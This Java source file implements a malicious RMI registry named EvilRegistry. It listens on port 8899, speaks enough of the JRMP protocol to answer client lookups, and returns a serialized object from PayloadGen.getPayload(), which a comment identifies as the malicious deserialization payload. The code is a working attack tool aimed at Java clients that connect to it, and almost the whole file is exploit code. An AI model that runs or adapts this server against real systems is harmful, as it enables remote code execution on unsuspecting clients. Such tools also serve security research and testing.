package RMI;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import javax.net.ServerSocketFactory;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import tools.PayloadGen;

// 在client lookup后，直接返回恶意stub，进行反序列化
public class EvilRegistry implements Runnable {
    public static void main(String[] args) {
        //before you start it, you should set vm options:"--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED"
        EvilRegistry.start();
    }
    private static final Logger log = LoggerFactory.getLogger(EvilRegistry.class);
    public String ip;
    public int port;
    private ServerSocket ss;
    private final Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private static EvilRegistry serverInstance;

    public EvilRegistry(String ip, int port) {
        try {
            this.ip = ip;
            this.port = port;
            this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static synchronized void start() {
        serverInstance = new EvilRegistry("0.0.0.0", 8899);
        Thread serverThread = new Thread(serverInstance);
        serverThread.start();
        log.warn("[RMI RMI.Server] is already running.");
    }

    public static synchronized void stop() {
        if (serverInstance != null) {
            serverInstance.exit = true;

            try {
                serverInstance.ss.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            serverInstance = null;
            System.out.println("[RMI RMI.Server] stopped.");
        }

    }

    public boolean waitFor(int i) {
        try {
            if (this.hadConnection) {
                return true;
            } else {
                System.out.println("[RMI RMI.Server] Waiting for connection");
                synchronized(this.waitLock) {
                    this.waitLock.wait((long)i);
                }

                return this.hadConnection;
            }
        } catch (InterruptedException var5) {
            return false;
        }
    }

    public void close() {
        this.exit = true;

        try {
            this.ss.close();
        } catch (IOException var4) {
        }

        synchronized(this.waitLock) {
            this.waitLock.notify();
        }
    }

    public void run() {
        System.out.println("[RMI RMI.Server] Listening on {}:{}" + "127.0.0.1" + "8899");

        try {
            Socket s = null;

            try {
                while(!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress)s.getRemoteSocketAddress();
                        System.out.println("[RMI RMI.Server] Have connection from " + remote);
                        InputStream is = s.getInputStream();
                        InputStream bufIn = (InputStream)(is.markSupported() ? is : new BufferedInputStream(is));
                        bufIn.mark(4);
                        DataInputStream in = new DataInputStream(bufIn);
                        Throwable var6 = null;

                        try {
                            int magic = in.readInt();
                            short version = in.readShort();
                            if (magic == 1246907721 && version == 2) {
                                OutputStream sockOut = s.getOutputStream();
                                BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                                DataOutputStream out = new DataOutputStream(bufOut);
                                Throwable var12 = null;

                                try {
                                    byte protocol = in.readByte();
                                    switch (protocol) {
                                        case 75:
                                            out.writeByte(78);
                                            if (remote.getHostName() != null) {
                                                out.writeUTF(remote.getHostName());
                                            } else {
                                                out.writeUTF(remote.getAddress().toString());
                                            }

                                            out.writeInt(remote.getPort());
                                            out.flush();
                                            in.readUTF();
                                            in.readInt();
                                        case 76:
                                            this.doMessage(s, in, out);
                                            bufOut.flush();
                                            out.flush();
                                            break;
                                        case 77:
                                        default:
                                            System.out.println("[RMI RMI.Server] Unsupported protocol");
                                            s.close();
                                    }
                                } catch (Throwable var88) {
                                    var12 = var88;
                                    throw var88;
                                } finally {
                                    if (out != null) {
                                        if (var12 != null) {
                                            try {
                                                out.close();
                                            } catch (Throwable var87) {
                                                var12.addSuppressed(var87);
                                            }
                                        } else {
                                            out.close();
                                        }
                                    }

                                }
                            } else {
                                s.close();
                            }
                        } catch (Throwable var90) {
                            var6 = var90;
                            throw var90;
                        } finally {
                            if (in != null) {
                                if (var6 != null) {
                                    try {
                                        in.close();
                                    } catch (Throwable var86) {
                                        var6.addSuppressed(var86);
                                    }
                                } else {
                                    in.close();
                                }
                            }

                        }
                    } catch (InterruptedException var92) {
                        return;
                    } catch (Exception e) {
                        e.printStackTrace(System.err);
                    } finally {
                        System.out.println("[RMI RMI.Server] Closing connection");
                        s.close();
                    }
                }

                return;
            } finally {
                if (s != null) {
                    s.close();
                }

                if (this.ss != null) {
                    this.ss.close();
                }

            }
        } catch (SocketException var96) {
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }

    }

    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.out.println("[RMI RMI.Server] Reading message...");
        int op = in.read();
        switch (op) {
            case 80:
                this.doCall(s, in, out);
                break;
            case 81:
            case 83:
            default:
                throw new IOException("unknown transport op " + op);
            case 82:
                out.writeByte(83);
                break;
            case 84:
                UID.read(in);
        }

        s.close();
    }

    private void doCall(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                } else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                } else {
                    throw new IOException("Not allowed to read object");
                }
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        } catch (IOException e) {
            throw new MarshalException("unable to read objID", e);
        }

        if (read.hashCode() == 2) {
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            if (this.handleRMI(s, ois, out)) {
                this.hadConnection = true;
                synchronized(this.waitLock) {
                    this.waitLock.notifyAll();
                    return;
                }
            }

            s.close();
        }

    }

    private boolean handleRMI(Socket s, ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt();
        ois.readLong();
        if (method != 2) {
            return false;
        } else {
            String object = (String)ois.readObject();
            out.writeByte(81);

            Object obj;
            try (ObjectOutputStream oos = new MarshalOutputStream(out, "evil")) {
                oos.writeByte(1);
                (new UID()).write(oos);
                String path = "/" + object;
                System.out.println("[RMI RMI.Server] Send payloadData for " + path);
                System.out.println();
                new Object();
                obj = PayloadGen.getPayload();//替换为序列化数据
                oos.writeObject(obj);
                oos.flush();
                out.flush();
                return true;
            }
        }
    }
    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt();
        ois.readLong();
    }
    static final class MarshalOutputStream extends ObjectOutputStream {
        private String sendUrl;

        public MarshalOutputStream(OutputStream out, String u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                this.writeObject(this.sendUrl);
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                this.writeObject((Object)null);
            } else {
                URL[] us = ((URLClassLoader)cl.getClassLoader()).getURLs();
                String cb = "";

                for(URL u : us) {
                    cb = cb + u.toString();
                }

                this.writeObject(cb);
            }

        }

        protected void annotateProxyClass(Class<?> cl) throws IOException {
            this.annotateClass(cl);
        }
    }


}